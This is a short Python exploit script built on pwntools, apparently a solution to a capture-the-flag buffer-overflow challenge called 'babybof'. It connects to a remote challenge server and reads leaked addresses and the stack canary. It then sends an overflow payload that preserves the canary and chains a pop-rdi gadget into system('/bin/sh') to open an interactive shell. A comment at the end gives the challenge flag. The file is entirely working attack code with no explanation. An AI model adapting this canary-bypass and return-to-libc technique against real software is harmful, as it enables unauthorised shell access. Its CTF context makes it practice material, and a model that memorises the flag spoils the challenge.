#!/usr/bin/env python3

from pwn import *

exe = ELF('./vuln')
# libc = ELF('')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

script = '''
'''

p = remote("babybof.chal.imaginaryctf.org", 1337)
#p = process('./vuln')
#p = gdb.debug('./vuln', gdbscript = script)

rcu(b"system @ ")
system = int(p.recvline(), 16)
rcu(b"ret @ ")
pop_rdi = int(p.recvline(), 16)
ret = pop_rdi + 1
rcu(b'/sh" @ ')
binsh = int(p.recvline(), 16)
rcu(b"canary: ")
canary = int(p.recvline(), 16)

payload = b"A" * 0x38 + p64(canary) + b"B" * 8 + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system)
sl(payload)

p.interactive()
#ictf{arent_challenges_written_two_hours_before_ctf_amazing}
